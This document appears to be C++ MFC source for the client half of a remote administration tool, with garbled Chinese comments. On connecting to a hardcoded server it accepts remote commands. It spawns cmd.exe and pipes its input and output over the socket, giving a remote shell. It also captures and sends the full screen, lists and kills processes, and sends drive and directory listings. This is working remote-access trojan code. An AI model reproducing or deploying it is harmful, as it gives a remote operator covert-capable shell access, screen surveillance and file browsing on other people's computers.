
// local-clientDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "local-client.h"
#include "local-clientDlg.h"
#include "afxdialogex.h"
#include "zlib.h"
#include <tlhelp32.h>
#include <Psapi.h>
#include "Buffer.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CLocalClientDlg �Ի���



CLocalClientDlg::CLocalClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CLocalClientDlg::IDD, pParent)
  , m_sServer(INVALID_SOCKET)
  , m_hCmdReadPipe(NULL)
  , m_hCmdWritePipe(NULL)
  , m_hReadPipe(NULL)
  , m_hWritePipe(NULL)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CLocalClientDlg::DoDataExchange(CDataExchange* pDX)
{
  CDialogEx::DoDataExchange(pDX);
  DDX_Control(pDX , IDC_STATIC_STATE , m_StaticText);
}

BEGIN_MESSAGE_MAP(CLocalClientDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
  ON_WM_TIMER()
  ON_WM_CLOSE()
END_MESSAGE_MAP()


// CLocalClientDlg ��Ϣ�������

BOOL CLocalClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO:  �ڴ���Ӷ���ĳ�ʼ������
  InitSocket();

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CLocalClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CLocalClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CLocalClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



// ������Ϣ�̻߳ص�
DWORD WINAPI RecMessageThreadProc(LPVOID lpParameter)
{
  CLocalClientDlg* obj = (CLocalClientDlg*)lpParameter;
  SOCKET sServer = obj->m_sServer;
  DWORD dwWritedBytes = 0;

  char* szBuff = NULL; //  = new char[ MAX_BUFFER_LEN ];
  char cRet = '\0';
  int nRecvedBytes = 0;
  DWORD nMessLen = 0;
  BYTE nMessType = -1;
  while(true)
  {
    szBuff = RecivPacket(sServer);

    if(szBuff != NULL)
    {
      nMessLen = *(DWORD*)szBuff;
      if(nMessLen > 0)
      {
        nMessType = *(BYTE*)(szBuff + sizeof(DWORD));
        switch(nMessType)
        {
          case emMessType::cmdstart:
            obj->CmdStart();
            break;
          case emMessType::cmdstext:
            obj->CmdInput(szBuff + sizeof(DWORD) + sizeof(BYTE) , nMessLen - sizeof(BYTE));
            break;
          case emMessType::screenrecv:
            obj->CaptureScreen();
            break;
          case emMessType::processrequest:
            obj->GetProcess();
            break;
          case emMessType::processkill:
            obj->KillProcess(*(DWORD*)(szBuff + sizeof(DWORD) + sizeof(BYTE)));
            break;
          case emMessType::filediskrequest:
            obj->OnDiskMsg();
            break;
          case emMessType::filepathrequest:
            obj->OnFileMsg(szBuff + sizeof(DWORD) + sizeof(BYTE));
            break;
          default:
            break;
        }
      }

      delete[] szBuff;
    }
    else
    {
      break;
    }
  }

  return 0;
}


// ������Ϣ�̻߳ص�
DWORD WINAPI SendCmdMessageThreadProc(LPVOID lpParameter)
{
  CLocalClientDlg* obj = (CLocalClientDlg*)lpParameter;
  SOCKET sClient = obj->m_sServer;
  int nSendedBytes = 0;

  DWORD dwReadedBytes = 0;
  DWORD dwBytesRead = 0;
  DWORD dwTotalBytesAvail = 0;
  DWORD dwBytesLeftThisMessage = 0;
  char szReadBuf[ 8192 ] = { 0 };
  TCHAR szReadBufW[ 8192 ] = { 0 };
  if(szReadBuf == NULL || szReadBufW == NULL)
  {
    return -1;
  }

  while(true)
  {
    Sleep(50);
    BOOL bRet = PeekNamedPipe(obj->m_hReadPipe,
                              NULL,
                              0,
                              &dwBytesRead,
                              &dwTotalBytesAvail,
                              &dwBytesLeftThisMessage);

    if(bRet == FALSE)
    {
      continue;
    }

    if (dwTotalBytesAvail > 0)
    {
      bRet = ReadFile(obj->m_hReadPipe,
                      szReadBuf,
                      dwTotalBytesAvail,
                      &dwReadedBytes,
                      NULL);

      // if(bRet == FALSE)
      // {
      //   continue;
      // }

      szReadBuf[ dwReadedBytes ] = '\0';

      int nLen = MultiByteToWideChar(CP_ACP, 0, szReadBuf, strlen(szReadBuf), NULL, 0);  

      MultiByteToWideChar(CP_ACP , 0 , szReadBuf , strlen(szReadBuf) , szReadBufW , nLen);

      // ������Ϣ
      obj->m_csSend.Lock();
      SendPacket(sClient ,
                 emMessType::cmdtext,
                 szReadBuf ,
                 strlen(szReadBuf) + 1
                );
      obj->m_csSend.Unlock();
    }
  }

  return 0;
}

void CLocalClientDlg::InitSocket()
{
  // 1. ����һ���׽��� socket
  m_sServer = socket(AF_INET , // ����Э���
                 SOCK_STREAM , // "��ʽ" -- TCP, SOCK_DGRAM "���ݱ�" -- UDP
                 IPPROTO_TCP);
  if(m_sServer == INVALID_SOCKET)
  {
    m_StaticText.SetWindowTextW(_T("���� Socket ʧ�ܣ�"));
    return ;
  }

  // 2. ���÷���� IP �� �˿� // �ͻ��˲���Ҫ��
  // sockaddr addr; // һ��14�ֽڴ�Ľṹ��
  m_addr.sin_family = AF_INET;
  m_addr.sin_addr.S_un.S_addr = inet_addr(SERVER_ADDR); // IP��ַ
  m_addr.sin_port = htons(SERVER_PORT); // htons() �������ֽ���תΪ������s����sort

  // 3. ���ӷ���� connect
  int nRet = connect(m_sServer , (sockaddr*)&m_addr , sizeof(sockaddr));
  if(nRet == SOCKET_ERROR)
  {
    m_StaticText.SetWindowTextW(_T("����ʧ�ܣ�"));
    return ;
  }

  m_StaticText.SetWindowTextW(_T("���ӳɹ���"));

  // 4. ���������߳�

  DWORD dwThreadId = 0;
  HANDLE hRecThread = CreateThread(NULL ,
                                0 ,
                                RecMessageThreadProc ,
                                (LPDWORD)this,
                                0 ,
                                &dwThreadId);


  // 5. ����������
  SendHeartBeat();

  // 6. ���ö�ʱ������������
  SetTimer(emTimerType::tHeartbeat , HEARTEBEAT_TIME, NULL);
}


void CLocalClientDlg::SendHeartBeat()
{
  m_csSend.Lock();
  SendPacket(m_sServer , emMessType::heartbeat , NULL , 0);
  m_csSend.Unlock();
}

void CLocalClientDlg::OnTimer(UINT_PTR nIDEvent)
{
  // TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
  switch(nIDEvent)
  {
    case emTimerType::tHeartbeat:
      SendHeartBeat();
      break;
    default:
      break;
  }

  CDialogEx::OnTimer(nIDEvent);
}


void CLocalClientDlg::CmdStart()
{
  static BOOL isStart = FALSE;
  if(isStart)
  {
    return;
  }
  isStart = TRUE;
  // ��������
  STARTUPINFO si = { 0 };
  si.cb = sizeof(si);
  // �����ܵ�

  memset(&m_pi , 0 , sizeof(PROCESS_INFORMATION));

  SECURITY_ATTRIBUTES sa = { 0 };
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;

  // ���������ܵ�
  BOOL bRet = CreatePipe(&m_hCmdReadPipe ,
                         &m_hWritePipe ,
                         &sa ,
                         0);

  if(bRet == FALSE)
  {
    return ;
  }

  bRet = CreatePipe(&m_hReadPipe ,
                    &m_hCmdWritePipe ,
                    &sa ,
                    0);

  if(bRet == FALSE)
  {
    return ;
  }

  // �ض�������������ܵ�
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.hStdInput = m_hCmdReadPipe;
  si.hStdOutput = m_hCmdWritePipe;
  si.hStdError = m_hCmdWritePipe;

  // ��Ŀ�����
  TCHAR szProcess[ MAXBYTE ] = { 0 };
  wcscpy_s(szProcess , MAXBYTE , TEXT("cmd.exe"));
  bRet = CreateProcess(NULL ,
                       szProcess ,
                       NULL ,
                       NULL ,
                       TRUE ,
                       0 ,
                       NULL ,
                       NULL ,
                       &si ,
                       &m_pi);

  // ���������߳� 
  DWORD dwThreadId = 0;
  HANDLE hRecThread = CreateThread(NULL ,
                                0 ,
                                SendCmdMessageThreadProc ,
                                (LPDWORD)this,
                                0 ,
                                &dwThreadId);


  if(bRet == FALSE)
  {
    return ;
  }


}


void CLocalClientDlg::OnClose()
{
  // TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
  if(m_pi.hProcess != INVALID_HANDLE_VALUE && m_pi.hProcess != NULL)
  {
    TerminateProcess(m_pi.hProcess , 0);
    CloseHandle(m_pi.hProcess);
  }

  CDialogEx::OnClose();
}


void CLocalClientDlg::CmdInput(char* szBuff , DWORD nBuffLen)
{
  if(szBuff != NULL && nBuffLen > 0)
  {
    DWORD dwWritedBytes = 0;
    WriteFile(m_hWritePipe,
              szBuff,
              strlen(szBuff),
              &dwWritedBytes,
              NULL);
  }
}


// ������Ļ�̻߳ص�
DWORD WINAPI SendScreenThreadProc(LPVOID lpParameter)
{
  CLocalClientDlg* obj = (CLocalClientDlg*)lpParameter;

  //�����ڴ�dc
  CDC memDc;
  //�ڴ�dc��������dc
  CDC* pDcDesktop = obj->GetDesktopWindow()->GetDC();
  memDc.CreateCompatibleDC(pDcDesktop);
  //�õ�������
  int nWidth = ::GetSystemMetrics(SM_CXSCREEN);
  int nHeigth = ::GetSystemMetrics(SM_CYSCREEN);

  CBitmap bmpSend;
  bmpSend.CreateCompatibleBitmap(pDcDesktop, nWidth, nHeigth);
  memDc.SelectObject(bmpSend);

  BOOL bRet =
      memDc.BitBlt(0, 0, nWidth, nHeigth, pDcDesktop, 0, 0, SRCCOPY);

  if (bRet == FALSE)
  {
      TRACE("bitBlt����");
      return -1;
  }

  DWORD dwScreenSize = 4 * nWidth * nHeigth;
  char* szBmpBuf = new char[dwScreenSize + 8];
  if (szBmpBuf == NULL)
  {
      TRACE("szBmpBuf�������");
      return -1;
  }

  *(int*)szBmpBuf = nWidth;
  *(int*)(szBmpBuf + 4) = nHeigth;
  //�õ�λͼ
  DWORD dwRet = bmpSend.GetBitmapBits(dwScreenSize, szBmpBuf + 8);

  if (dwRet == 0)
  {
      TRACE("GetBitmapBits����");
      return -1;
  }

  //ʹ��zlibѹ�������ȼ���ѹ����Ĵ�С
  uLongf nCompressedlen = compressBound(dwScreenSize+8); /* ѹ����ĳ����ǲ��ᳬ��nCompressedlen�� */
  //���ݰ��ڵ����ݴ�С��ѹ����Ĵ�С������Ļ����
  
  uLongf nDataSize = nCompressedlen + sizeof(uLongf);
  char* pBuf = new char[nDataSize];
  //��ʼѹ������ 
  if (compress((Bytef*)(pBuf + sizeof(uLongf)),
      (uLongf*)&nCompressedlen,
      (Bytef*)szBmpBuf,
      (uLongf)nDataSize) != Z_OK)
  {
      //˵��ѹ��ʧ��
      TRACE("ѹ��ʧ��");
      return -1;
  }
  //��ѹ��ǰ�Ĵ�С�ӵ����ݰ���ͷ��
  *(DWORD*)pBuf = dwScreenSize + 8;
  //uLongf nDataSize = nCompressedlen + sizeof(uLongf);

  // ��ʼ��������

  obj->m_csSend.Lock();
  int nRet = SendPacket(obj->m_sServer, emMessType::screenbmp, pBuf, nCompressedlen+sizeof(DWORD));
  obj->m_csSend.Unlock();
  if (nRet == SOCKET_ERROR)
  {
      TRACE("��������ʧ��");
      return -1;
  }
  //�ͷ���Դ
  if (szBmpBuf != NULL)
  {
      delete[] szBmpBuf;
      szBmpBuf = NULL;
  }  
  if (pBuf != NULL)
  {
      delete[] pBuf;
      pBuf = NULL;
  }

  return 0;
}


void CLocalClientDlg::CaptureScreen()
{
  // ����������Ļ�߳� 
  DWORD dwThreadId = 0;
  HANDLE hRecThread = CreateThread(NULL ,
                                0 ,
                                SendScreenThreadProc ,
                                (LPDWORD)this,
                                0 ,
                                &dwThreadId);
  // SendScreenThreadProc((LPVOID)this);

}


// ���ͽ����̻߳ص�
DWORD WINAPI SendProcessThreadProc(LPVOID lpParameter)
{
  CLocalClientDlg* obj = (CLocalClientDlg*)lpParameter;

  HANDLE         hProcessSnap = NULL;
  DWORD          bRet = FALSE;
  PROCESSENTRY32 pe32 = { 0 };
  TCHAR szExeName[MAX_PATH] = { 0 };
  DWORD nExeFileLen = 0;

  //  Take a snapshot of all processes in the system. 

  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (hProcessSnap == INVALID_HANDLE_VALUE || hProcessSnap == NULL)
    return (FALSE);

  //  Fill in the size of the structure before using it. 

  pe32.dwSize = sizeof(PROCESSENTRY32);

  //  Walk the snapshot of the processes, and for each process, 
  //  display information. 

  if (Process32First(hProcessSnap, &pe32))
  {
    do
    {
        *(DWORD*)szExeName = pe32.th32ProcessID;
        nExeFileLen = wcslen(pe32.szExeFile);
        memcpy_s((char*)(szExeName + sizeof(short)) , MAX_PATH - sizeof(DWORD), pe32.szExeFile, (nExeFileLen + 1) * 2), 
        // wcscpy_s(szExeName + sizeof(short) , MAX_PATH , pe32.szExeFile);

        obj->m_csSend.Lock();
        SendPacket(obj->m_sServer , emMessType::processtext , (char*)szExeName ,
                   (wcslen(szExeName + sizeof(short)) + sizeof(short)) * sizeof(short) + sizeof(short));
        obj->m_csSend.Unlock();
        Sleep(1); // ��ֵ�Bug����˯������

    } while (Process32Next(hProcessSnap, &pe32));

    bRet = TRUE;
  }
  else
  {
    bRet = FALSE;    // could not walk the list of processes 
  }

  // Do not forget to clean up the snapshot object. 

  CloseHandle(hProcessSnap);
  return (bRet);
}


void CLocalClientDlg::GetProcess()
{
  // ����������Ļ�߳� 
  DWORD dwThreadId = 0;
  HANDLE hRecThread = CreateThread(NULL ,
                                0 ,
                                SendProcessThreadProc ,
                                (LPDWORD)this,
                                0 ,
                                &dwThreadId);
}


void CLocalClientDlg::KillProcess(DWORD PID)
{
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);
  BOOL nRet = TerminateProcess(hProcess , 0);
  CloseHandle(hProcess);

  if(nRet)
  {
     m_csSend.Lock();
     SendPacket(m_sServer , emMessType::processkillsecc , NULL, 0 );
     m_csSend.Unlock();
  }
  else
  {
     m_csSend.Lock();
     SendPacket(m_sServer , emMessType::processkillfail , NULL, 0 );
     m_csSend.Unlock();
  }
}


//��ȡ������Ϣ
void CLocalClientDlg::OnDiskMsg()
{
    TCHAR buf[MAXBYTE] = { 0 };
    GetLogicalDriveStrings(MAXBYTE, buf);
    TCHAR* pBuf = buf;
    // CBuffer myBuff;
    CString strSend = _T("");
    while (*pBuf)
    {
        if (GetDriveType(pBuf) == DRIVE_FIXED)
        {
            ULARGE_INTEGER freeToCaller = { 0 };
            ULARGE_INTEGER totalBytes = { 0 };
            ULARGE_INTEGER freeBytes = { 0 };
            GetDiskFreeSpaceEx(pBuf, &freeToCaller, &totalBytes, &freeBytes);
            SHFILEINFO sfi = { 0 };

            DWORD attr = GetFileAttributes(pBuf);

            (HIMAGELIST)SHGetFileInfo(pBuf,
                attr,
                &sfi,
                sizeof(sfi),
                SHGFI_ICON | SHGFI_USEFILEATTRIBUTES | SHGFI_TYPENAME | SHGFI_DISPLAYNAME);
            TCHAR* szDiskName = pBuf;
            int nIcon = sfi.iIcon;
            TCHAR* szTypeName = sfi.szTypeName;
            ULONGLONG uFreeBytes = freeBytes.QuadPart;

            PackageDiskInfo(strSend, szDiskName, nIcon, szTypeName, uFreeBytes);
            // myBuff.Write(strSend);
        }
        pBuf += _tcslen(pBuf) + 1;
    }

    m_csSend.Lock();
    SendPacket(m_sServer, emMessType::filedisk, (char*)(strSend.GetBuffer()), (strSend.GetLength() + 1) * 2);
    m_csSend.Unlock();

}


void CLocalClientDlg::PackageDiskInfo(CString& strSend,
                                      TCHAR* szDiskName,
                                      int nIcon,
                                      TCHAR* szTypeName,
                                      ULONGLONG uReeBytes)
{
    strSend += szDiskName;
    strSend += _T("#");

    CString strIcon;
    strIcon.Format(_T("%d"), nIcon);
    strSend += strIcon;
    strSend += _T("#");

    strSend += szTypeName;
    strSend += _T("#");

    CString struReeBytes;
    struReeBytes.Format(_T("%d"), uReeBytes);
    strSend += struReeBytes;
    strSend += _T("#");
}


void CLocalClientDlg::OnFileMsg(char* szDirA)
{
  TCHAR* szDir = NULL;
  szDir = (TCHAR*)szDirA;
    //��ȡ��Ŀ¼
    WIN32_FIND_DATA findData;
    CString strPath;
    strPath.Format(_T("%s"), szDir);
    CString findStr = strPath + _T("*.*");
    HANDLE hFind = FindFirstFile(findStr.GetBuffer(0), &findData);
    CString strSend = _T("");
    
    if (hFind != INVALID_HANDLE_VALUE)
    {
        while (true)
        {
            CString filePath = strPath + findData.cFileName;
            SHFILEINFO sfi = { 0 };
            //      Tools::GetFileInfo(filePath.GetBuffer(0),sfi);
            //��ȡ�ļ���Ϣ 
            DWORD attr = GetFileAttributes(filePath.GetBuffer(0));

            (HIMAGELIST)SHGetFileInfo(filePath.GetBuffer(0),
                attr,
                &sfi,
                sizeof(sfi),
                SHGFI_ICON | SHGFI_USEFILEATTRIBUTES | SHGFI_TYPENAME | SHGFI_DISPLAYNAME);

            //�ļ���
            CString fileName = findData.cFileName;
            if (fileName == _T(".") || fileName == _T(".."))
            {
                if (!FindNextFile(hFind, &findData))
                {
                    break;
                }
                continue;;
            }

            //ͼ��
            int nIcon = sfi.iIcon;

            //�ǲ����ļ���
            int nIsDir = 0;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                nIsDir = 1;
            }
            else
            {
                nIsDir = 0;
            }

            FILETIME ft;
            FileTimeToLocalFileTime(&findData.ftLastWriteTime, &ft);
            CTime time(ft);
            //�޸�ʱ��
            CString strTime = time.Format("%Y/%m/%d %H:%M");
            //����
            TCHAR* szType = sfi.szTypeName;
            //��С
            DWORD dwSize = findData.nFileSizeLow;

            PackageFileInfo(strSend, fileName, nIcon, nIsDir, strTime, szType, dwSize);

            if (!FindNextFile(hFind, &findData))
            {
                break;
            }
        }
        FindClose(hFind);
    }
    m_csSend.Lock();
    SendPacket(m_sServer, emMessType::filelist, (char*)(strSend.GetBuffer()), (strSend.GetLength() + 1) * 2);
    m_csSend.Unlock();
}


void CLocalClientDlg::PackageFileInfo
(CString& strSend, CString& fileName, int nIcon, int nIsDir, CString&strTime, TCHAR* szType, DWORD dwSize)
{
    strSend += fileName;
    strSend += _T("#");

    CString strIcon;
    strIcon.Format(_T("%d"), nIcon);
    strSend += strIcon;
    strSend += _T("#");

    CString strIsDir;
    strIsDir.Format(_T("%d"), nIsDir);
    strSend += strIsDir;
    strSend += _T("#");

    strSend += strTime;
    strSend += _T("#");

    strSend += szType;
    strSend += _T("#");

    CString strSize;
    strSize.Format(_T("%d"), dwSize);
    strSend += strSize;
    strSend += _T("#");
}
